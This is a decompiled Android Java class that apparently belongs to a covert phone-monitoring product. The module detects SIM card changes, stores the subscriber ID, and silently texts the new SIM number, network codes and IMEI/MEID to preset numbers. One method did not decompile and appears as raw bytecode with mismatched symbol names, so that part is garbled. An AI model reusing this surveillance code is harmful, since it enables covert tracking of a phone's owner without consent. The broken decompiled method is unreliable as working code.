package com.vvt.capture.simchange;

import android.content.Context;
import android.content.IntentFilter;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.vvt.base.RunningMode;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.io.q;
import com.vvt.k.e;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class SimChangeCapture
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private b d;
  private SimChangeCapture.SimChangedReceiver e;
  private com.vvt.base.a f;
  private com.vvt.phoneinfo.a g;
  private d h;
  private d i;
  private com.vvt.productinfo.a j;
  private String k;
  private String l;
  private TelephonyManager m;
  private com.vvt.ae.f n;
  private boolean o;
  private boolean p;
  private Context q;
  private boolean r;
  private boolean s;
  
  public SimChangeCapture(Context paramContext, String paramString1, RunningMode paramRunningMode, com.vvt.phoneinfo.a parama, com.vvt.productinfo.a parama1, com.vvt.base.a parama2, String paramString2, boolean paramBoolean1, boolean paramBoolean2, com.vvt.ae.f paramf)
  {
    this.q = paramContext;
    this.l = paramString1;
    this.g = parama;
    this.j = parama1;
    this.f = parama2;
    this.k = paramString2;
    this.n = paramf;
    Object localObject = RunningMode.FULL;
    boolean bool;
    if (paramRunningMode == localObject) {
      bool = true;
    }
    for (;;)
    {
      this.r = bool;
      localObject = (TelephonyManager)paramContext.getSystemService("phone");
      this.m = ((TelephonyManager)localObject);
      this.o = paramBoolean1;
      this.p = paramBoolean2;
      localObject = new com/vvt/capture/simchange/SimChangeCapture$SimChangedReceiver;
      ((SimChangeCapture.SimChangedReceiver)localObject).<init>(this);
      this.e = ((SimChangeCapture.SimChangedReceiver)localObject);
      return;
      bool = false;
      localObject = null;
    }
  }
  
  private String a(com.vvt.phoneinfo.a parama, com.vvt.productinfo.a parama1, String paramString)
  {
    String str = parama1.getProductName();
    Object localObject = parama.c();
    int i1 = parama.a();
    int i2 = parama.b();
    Object[] arrayOfObject = new Object[5];
    arrayOfObject[0] = str;
    arrayOfObject[1] = localObject;
    localObject = Integer.valueOf(i1);
    arrayOfObject[2] = localObject;
    localObject = Integer.valueOf(i2);
    arrayOfObject[3] = localObject;
    arrayOfObject[4] = paramString;
    return String.format("%s has detected SIM change. New SIM number is now as this SMS.\nNetwork: %s\nMNC: %s\nMCC: %s\nIMEI | MEID: %s", arrayOfObject);
  }
  
  private String a(String paramString1, String paramString2)
  {
    String str1 = com.vvt.base.a.b.a(com.vvt.base.a.a.p);
    String str2 = e.a("2", paramString1, paramString2, str1);
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString1;
    arrayOfObject[1] = str2;
    return String.format("<2><%s><%s>", arrayOfObject);
  }
  
  private void a(FxSystemEventCategories paramFxSystemEventCategories, String paramString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject).<init>();
    FxEventDirection localFxEventDirection = FxEventDirection.OUT;
    ((FxSystemEvent)localObject).setDirection(localFxEventDirection);
    long l1 = System.currentTimeMillis();
    ((FxSystemEvent)localObject).setEventTime(l1);
    ((FxSystemEvent)localObject).setLogType(paramFxSystemEventCategories);
    ((FxSystemEvent)localObject).setMessage(paramString);
    localArrayList.add(localObject);
    localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      ((com.vvt.base.a)localObject).a(localArrayList);
    }
  }
  
  private void a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = this.o;
    if (bool1)
    {
      Object localObject1 = this.g.d();
      Object localObject2 = this.k;
      localObject1 = a((String)localObject1, (String)localObject2);
      boolean bool2 = a;
      if (bool2) {}
      localObject2 = FxSystemEventCategories.CATEGORY_SIM_CHANGE;
      a((FxSystemEventCategories)localObject2, (String)localObject1);
      localObject2 = this.h.a();
      a((String)localObject1, (List)localObject2);
      localObject1 = this.g;
      localObject2 = this.j;
      String str = this.g.d();
      localObject1 = a((com.vvt.phoneinfo.a)localObject1, (com.vvt.productinfo.a)localObject2, str);
      localObject2 = FxSystemEventCategories.CATEGORY_SIM_CHANGE;
      a((FxSystemEventCategories)localObject2, (String)localObject1);
      bool2 = this.p;
      if (!bool2) {
        break label184;
      }
      bool2 = a;
      if (bool2) {}
      localObject2 = this.i.a();
      a((String)localObject1, (List)localObject2);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (!bool1) {
        break;
      }
      break;
      label184:
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private void a(String paramString, List paramList)
  {
    boolean bool1;
    if (paramList != null)
    {
      int i1 = paramList.size();
      if (i1 > 0)
      {
        Iterator localIterator = paramList.iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          String str = (String)localIterator.next();
          boolean bool2 = a;
          if (bool2) {}
          com.vvt.ae.f localf = this.n;
          localf.a(str, paramString);
        }
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private void b(String paramString)
  {
    int i1 = 2;
    Object[] arrayOfObject = new Object[i1];
    String str1 = this.l;
    arrayOfObject[0] = str1;
    int i2 = 1;
    str1 = "sim_id.dat";
    arrayOfObject[i2] = str1;
    String str2 = String.format("%s/%s", arrayOfObject);
    q.a(paramString, str2);
    boolean bool = b;
    if (bool) {}
  }
  
  /* Error */
  private void f()
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: getstatic 39	com/vvt/capture/simchange/SimChangeCapture:a	Z
    //   5: istore_1
    //   6: iload_1
    //   7: ifeq +3 -> 10
    //   10: aload_0
    //   11: invokespecial 257	com/vvt/capture/simchange/SimChangeCapture:FxFileObserverWorker	()Ljava/lang/String;
    //   14: astore_2
    //   15: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   18: istore_3
    //   19: iload_3
    //   20: ifeq +3 -> 23
    //   23: aload_0
    //   24: invokespecial 259	com/vvt/capture/simchange/SimChangeCapture:AppEngine1	()Ljava/lang/String;
    //   27: astore 4
    //   29: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   32: istore 5
    //   34: iload 5
    //   36: ifeq +3 -> 39
    //   39: aload 4
    //   41: ifnull +165 -> 206
    //   44: aload 4
    //   46: aload_2
    //   47: invokevirtual 262	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   50: istore_1
    //   51: iload_1
    //   52: ifne +143 -> 195
    //   55: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   58: istore_1
    //   59: iload_1
    //   60: ifeq +3 -> 63
    //   63: aload_0
    //   64: aload 4
    //   66: invokespecial 264	com/vvt/capture/simchange/SimChangeCapture:a	(Ljava/lang/String;)V
    //   69: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   72: istore_1
    //   73: iload_1
    //   74: ifeq +3 -> 77
    //   77: aload_0
    //   78: aload 4
    //   80: invokespecial 266	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	(Ljava/lang/String;)V
    //   83: aload_0
    //   84: getfield 73	com/vvt/capture/simchange/SimChangeCapture:r	Z
    //   87: istore_1
    //   88: iload_1
    //   89: ifeq +75 -> 164
    //   92: new 268	com/vvt/j/MyUncaughtExceptionHandler
    //   95: astore_2
    //   96: aload_2
    //   97: invokespecial 269	com/vvt/j/MyUncaughtExceptionHandler:<init>	()V
    //   100: ldc_w 271
    //   103: astore 4
    //   105: aload_0
    //   106: getfield 54	com/vvt/capture/simchange/SimChangeCapture:l	Ljava/lang/String;
    //   109: astore 6
    //   111: aload_2
    //   112: aload 4
    //   114: aload 6
    //   116: invokevirtual 272	com/vvt/j/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   119: astore_2
    //   120: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   123: istore_3
    //   124: iload_3
    //   125: ifeq +3 -> 128
    //   128: new 274	com/vvt/capture/simchange/FxFileObserverWorker
    //   131: astore 4
    //   133: aload 4
    //   135: invokespecial 275	com/vvt/capture/simchange/FxFileObserverWorker:<init>	()V
    //   138: aload 4
    //   140: aload_2
    //   141: invokevirtual 278	com/vvt/capture/simchange/FxFileObserverWorker:a	(Ljava/lang/String;)Z
    //   144: istore_1
    //   145: iload_1
    //   146: ifeq +42 -> 188
    //   149: ldc_w 280
    //   152: astore_2
    //   153: getstatic 39	com/vvt/capture/simchange/SimChangeCapture:a	Z
    //   156: istore_1
    //   157: iload_1
    //   158: ifeq +3 -> 161
    //   161: aload_0
    //   162: monitorexit
    //   163: return
    //   164: new 268	com/vvt/j/MyUncaughtExceptionHandler
    //   167: astore_2
    //   168: aload_2
    //   169: invokespecial 269	com/vvt/j/MyUncaughtExceptionHandler:<init>	()V
    //   172: aload_0
    //   173: getfield 52	com/vvt/capture/simchange/SimChangeCapture:q	Landroid/content/Context;
    //   176: astore 4
    //   178: aload_2
    //   179: aload 4
    //   181: invokevirtual 283	com/vvt/j/MyUncaughtExceptionHandler:a	(Landroid/content/Context;)Ljava/lang/String;
    //   184: astore_2
    //   185: goto -65 -> 120
    //   188: ldc_w 285
    //   191: astore_2
    //   192: goto -39 -> 153
    //   195: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   198: istore_1
    //   199: iload_1
    //   200: ifeq -47 -> 153
    //   203: goto -50 -> 153
    //   206: getstatic 42	com/vvt/capture/simchange/SimChangeCapture:removeFromPath	Z
    //   209: istore_1
    //   210: iload_1
    //   211: ifeq -58 -> 153
    //   214: goto -61 -> 153
    //   217: astore_2
    //   218: aload_0
    //   219: monitorexit
    //   220: aload_2
    //   221: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	222	0	this	SimChangeCapture
    //   5	206	1	bool1	boolean
    //   14	178	2	localObject1	Object
    //   217	4	2	localObject2	Object
    //   18	107	3	bool2	boolean
    //   27	153	4	localObject3	Object
    //   32	3	5	bool3	boolean
    //   109	6	6	str	String
    // Exception table:
    //   from	to	target	type
    //   2	5	217	finally
    //   10	14	217	finally
    //   15	18	217	finally
    //   23	27	217	finally
    //   29	32	217	finally
    //   46	50	217	finally
    //   55	58	217	finally
    //   64	69	217	finally
    //   69	72	217	finally
    //   78	83	217	finally
    //   83	87	217	finally
    //   92	95	217	finally
    //   96	100	217	finally
    //   105	109	217	finally
    //   114	119	217	finally
    //   120	123	217	finally
    //   128	131	217	finally
    //   133	138	217	finally
    //   140	144	217	finally
    //   153	156	217	finally
    //   164	167	217	finally
    //   168	172	217	finally
    //   172	176	217	finally
    //   179	184	217	finally
    //   195	198	217	finally
    //   206	209	217	finally
  }
  
  private String g()
  {
    boolean bool1 = false;
    int i1 = 2;
    Object localObject1 = new Object[i1];
    String str = this.l;
    localObject1[0] = str;
    int i3 = 1;
    str = "sim_id.dat";
    localObject1[i3] = str;
    Object localObject2 = q.a(String.format("%s/%s", (Object[])localObject1));
    if (localObject2 != null)
    {
      boolean bool2 = localObject2 instanceof String;
      if (bool2)
      {
        localObject2 = (String)localObject2;
        localObject1 = ((String)localObject2).trim();
        int i2 = ((String)localObject1).length();
        if (i2 != 0) {}
      }
    }
    for (localObject2 = null;; localObject2 = null)
    {
      bool1 = b;
      if (bool1) {}
      return (String)localObject2;
    }
  }
  
  private String h()
  {
    int i1 = 5;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    String str = null;
    int i2 = 0;
    if ((str == null) && (i2 < i1))
    {
      TelephonyManager localTelephonyManager = this.m;
      int i3 = localTelephonyManager.getSimState();
      boolean bool4 = a;
      if ((!bool4) || (i3 == i1)) {
        i3 = 1;
      }
      for (;;)
      {
        if (i3 != 0) {
          str = this.m.getSubscriberId();
        }
        if (str != null) {
          break label123;
        }
        if (i3 != 0)
        {
          boolean bool2 = b;
          if (!bool2) {}
        }
        long l1 = 3000L;
        SystemClock.sleep(l1);
        int i4 = i2 + 1;
        i2 = i4;
        break;
        i4 = 0;
        localTelephonyManager = null;
      }
    }
    label123:
    boolean bool3 = a;
    if (bool3) {}
    bool3 = a;
    if (bool3) {}
    return str;
  }
  
  public void a()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = this.s;
    Object localObject1;
    Object localObject2;
    if (!bool1)
    {
      this.s = true;
      bool1 = this.r;
      if (!bool1) {
        break label106;
      }
      localObject1 = f.a();
      localObject2 = this.d;
      if (localObject2 == null)
      {
        boolean bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
          localObject2 = new com/vvt/capture/simchange/b;
          ((b)localObject2).<init>(this, (String)localObject1);
          this.d = ((b)localObject2);
          localObject1 = this.d;
          ((b)localObject1).startWatching();
        }
      }
    }
    for (;;)
    {
      localObject1 = new com/vvt/capture/simchange/a;
      localObject2 = "SimChangeCT";
      ((a)localObject1).<init>(this, (String)localObject2);
      ((Thread)localObject1).start();
      bool1 = a;
      if (bool1) {}
      return;
      label106:
      localObject1 = new android/content/IntentFilter;
      ((IntentFilter)localObject1).<init>("android.intent.action.SIM_STATE_CHANGED");
      localObject2 = this.q;
      SimChangeCapture.SimChangedReceiver localSimChangedReceiver = this.e;
      ((Context)localObject2).registerReceiver(localSimChangedReceiver, (IntentFilter)localObject1);
    }
  }
  
  public void a(d paramd)
  {
    this.h = paramd;
  }
  
  public void b()
  {
    String str = g();
    if (str == null)
    {
      str = h();
      if (str != null) {
        b(str);
      }
    }
    for (;;)
    {
      return;
      boolean bool = b;
      if (bool) {}
      f();
    }
  }
  
  public void b(d paramd)
  {
    this.i = paramd;
  }
  
  public void c()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.s;
    Object localObject;
    if (bool)
    {
      localObject = null;
      this.s = false;
      bool = b;
      if (bool) {}
      localObject = "";
      b((String)localObject);
      bool = this.r;
      if (!bool) {
        break label92;
      }
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        this.d.stopWatching();
        bool = false;
        localObject = null;
        this.d = null;
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      label92:
      localObject = this.q;
      SimChangeCapture.SimChangedReceiver localSimChangedReceiver = this.e;
      ((Context)localObject).unregisterReceiver(localSimChangedReceiver);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/SimChangeCapture.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */